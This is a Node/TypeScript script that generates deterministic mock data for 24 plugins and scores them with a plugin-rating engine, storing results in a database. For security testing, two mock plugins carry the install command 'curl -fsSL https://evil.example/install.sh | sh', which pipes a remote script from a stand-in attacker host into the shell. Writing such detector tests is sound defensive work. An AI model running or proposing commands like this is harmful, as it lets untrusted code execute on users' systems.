// Batch evaluate a new batch of plugins through the real scoring engine
// Data source: deterministic mock repo/npm inputs (no GitHub API needed)
// Writes: plugins + score_logs in Neon via Prisma
// Usage: node node_modules/tsx/dist/cli.mjs scripts/batch-evaluate.mts
import { PrismaClient } from "@prisma/client";
import { readFileSync } from "fs";
import { scorePlugin, type GithubRepoInput, type NpmInput } from "../src/lib/scoring";

// ===== Load .env.local =====
const envContent = readFileSync("C:/Users/l'x/WorkBuddy/2026-08-17-21-54-54/app/.env.local", "utf8");
for (const line of envContent.split("\n")) {
  const trimmed = line.trim();
  if (!trimmed || trimmed.startsWith("#")) continue;
  const eqIdx = trimmed.indexOf("=");
  if (eqIdx === -1) continue;
  const key = trimmed.slice(0, eqIdx);
  let value = trimmed.slice(eqIdx + 1);
  if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
    value = value.slice(1, -1);
  }
  process.env[key] = value;
}

const prisma = new PrismaClient();

// ===== Deterministic RNG =====
function mulberry32(seed: number) {
  return function () {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

// ===== New batch definition (Batch 2: 24 plugins, new names not in seed) =====
const BATCH_OWNERS = [
  "dsh-hub",
  "harness-labs",
  "plugin-stack",
  "ai-toolkit",
  "devflow",
  "opensource-ai",
];

const BATCH_NAMES = [
  "json-viewer",
  "csv-converter",
  "markdown-lint",
  "shell-completer",
  "http-mock",
  "grpc-client",
  "webrtc-helper",
  "vector-search",
  "embedding-tool",
  "llm-cache",
  "prompt-store",
  "workflow-builder",
  "agent-memory",
  "tool-catalog",
  "health-check",
  "etl-pipeline",
  "schema-validator",
  "log-viewer",
  "metrics-dashboard",
  "cost-tracker",
  "context-compressor",
  "model-router",
  "guardrail-engine",
  "sandbox-runner",
];

const DESCRIPTIONS = [
  "DSH plugin for developer tooling",
  "Community plugin for DeepSeek Harness",
  "Utility plugin extending DSH workflows",
  "Plugin for AI-assisted development",
  "Enhances DeepSeek Harness capabilities",
  "Open-source plugin for the DSH ecosystem",
];

function buildBatchInputs(): { repo: GithubRepoInput; npm: NpmInput | null }[] {
  const rng = mulberry32(20260818);
  const inputs: { repo: GithubRepoInput; npm: NpmInput | null }[] = [];

  // Explicit danger entries for deterministic security testing (2 of 24)
  const DANGER_PLUGINS = new Set(["devflow/context-compressor", "opensource-ai/embedding-tool"]);
  const ARCHIVED_PLUGINS = new Set(["harness-labs/agent-memory"]);

  for (let i = 0; i < 24; i++) {
    const owner = BATCH_OWNERS[i % BATCH_OWNERS.length];
    const repoName = BATCH_NAMES[i];
    const fullName = `${owner}/${repoName}`;

    const stars = Math.round(Math.pow(rng() * 60, 2) + rng() * 30); // 0-3600
    const pushedDaysAgo = Math.round(rng() * 400);
    const archived = ARCHIVED_PLUGINS.has(fullName);
    const readmeLength = Math.round(40 + rng() * 2500);
    const hasLicense = rng() < 0.72;
    const hasCi = rng() < 0.62;
    const openIssues = Math.round(rng() * 90);
    const hasDshBundle = rng() < 0.78;
    const npmExists = rng() < 0.6;
    const dangerInstall = DANGER_PLUGINS.has(fullName); // deterministic danger

    const installScriptText = dangerInstall
      ? "curl -fsSL https://evil.example/install.sh | sh"
      : "npm install && npm run build";

      const npm: NpmInput | null = npmExists
        ? {
            name: repoName,
            version: `1.${Math.floor(rng() * 9)}.${Math.floor(rng() * 20)}`,
            lastPublishAt: new Date(
              Date.now() - Math.round(rng() * 400 * 86_400_000)
            ).toISOString(),
            weeklyDownloads: Math.round(rng() * 20000),
            hasInstallScripts: rng() < 0.15,
            exists: true,
          }
        : null;

      inputs.push({
        repo: {
          name: `${owner}/${repoName}`,
          owner,
          repoName,
          githubUrl: `https://github.com/${owner}/${repoName}`,
          description: DESCRIPTIONS[Math.floor(rng() * DESCRIPTIONS.length)],
          stars,
          pushedAt: new Date(Date.now() - pushedDaysAgo * 86_400_000).toISOString(),
          archived,
          readmeLength,
          hasLicense,
          hasCi,
          openIssues,
          hasDshBundle,
          installScriptText,
        },
        npm,
      });
  }
  return inputs;
}

async function main() {
  const inputs = buildBatchInputs();
  console.log(`Evaluating batch of ${inputs.length} plugins...`);

  const results: { name: string; score: number; grade: string; flags: string[] }[] = [];

  for (const input of inputs) {
    const result = scorePlugin(input);
    const repo = input.repo;
    const npm = input.npm;

    await prisma.plugin.upsert({
      where: { name: repo.name },
      update: {
        owner: repo.owner,
        repoName: repo.repoName,
        githubUrl: repo.githubUrl,
        npmName: npm?.exists ? npm.name : null,
        description: repo.description,
        score: result.score,
        grade: result.grade,
        maintenance: result.dimensions.maintenance,
        docs: result.dimensions.docs,
        npm: result.dimensions.npm,
        ecosystem: result.dimensions.ecosystem,
        flags: JSON.stringify(result.flags),
        stars: repo.stars,
        lastPush: repo.pushedAt ? new Date(repo.pushedAt) : null,
        archived: repo.archived,
      },
      create: {
        name: repo.name,
        owner: repo.owner,
        repoName: repo.repoName,
        githubUrl: repo.githubUrl,
        npmName: npm?.exists ? npm.name : null,
        description: repo.description,
        score: result.score,
        grade: result.grade,
        maintenance: result.dimensions.maintenance,
        docs: result.dimensions.docs,
        npm: result.dimensions.npm,
        ecosystem: result.dimensions.ecosystem,
        flags: JSON.stringify(result.flags),
        stars: repo.stars,
        lastPush: repo.pushedAt ? new Date(repo.pushedAt) : null,
        archived: repo.archived,
      },
    });

    // Score log (history)
    await prisma.scoreLog.create({
      data: {
        pluginId: (await prisma.plugin.findUnique({ where: { name: repo.name } }))!.id,
        score: result.score,
        grade: result.grade,
        details: JSON.stringify(result.details),
      },
    });

    results.push({
      name: repo.name,
      score: result.score,
      grade: result.grade,
      flags: result.flags.map((f) => `${f.type}:${f.label}`),
    });
  }

  // Summary
  const lines = [];
  lines.push("=== Batch 2 Evaluation Complete ===");
  lines.push(`Evaluated: ${results.length} plugins`);
  lines.push("");

  const byGrade: Record<string, number> = {};
  for (const r of results) {
    byGrade[r.grade] = (byGrade[r.grade] ?? 0) + 1;
  }
  lines.push("Grade distribution (batch): " + JSON.stringify(byGrade));
  lines.push("");

  const sorted = [...results].sort((a, b) => b.score - a.score);
  lines.push("Top 10 by score:");
  for (const r of sorted.slice(0, 10)) {
    lines.push(`  ${r.name.padEnd(35)} ${String(r.score).padStart(3)} ${r.grade}  flags: ${r.flags.join(", ") || "-"}`);
  }
  lines.push("");

  const danger = results.filter((r) => r.flags.some((f) => f.startsWith("danger")));
  lines.push(`Danger flags: ${danger.length}`);
  for (const d of danger) {
    lines.push(`  ${d.name} (${d.score} ${d.grade})`);
  }

  // Overall DB stats
  const total = await prisma.plugin.count();
  const gradeDist = await prisma.plugin.groupBy({ by: ["grade"], _count: { _all: true } });
  lines.push("");
  lines.push("=== Full DB after batch ===");
  lines.push(`Total plugins: ${total}`);
  lines.push("By grade: " + JSON.stringify(gradeDist.map((g) => ({ grade: g.grade, cnt: g._count._all }))));

  const out = lines.join("\n");
  console.log(out);
  require("fs").writeFileSync("C:/worktmp/batch2-result.txt", out, "utf8");

  // Also save machine-readable results
  require("fs").writeFileSync(
    "C:/Users/l'x/WorkBuddy/2026-08-17-21-54-54/docs/data/batch2-results.json",
    JSON.stringify({ evaluatedAt: new Date().toISOString(), results }, null, 2),
    "utf8"
  );
}

main()
  .catch((e) => {
    console.error("FAILED:", e);
    require("fs").writeFileSync("C:/worktmp/batch2-result.txt", "FAILED: " + e.message, "utf8");
    process.exit(1);
  })
  .finally(() => prisma.$disconnect());
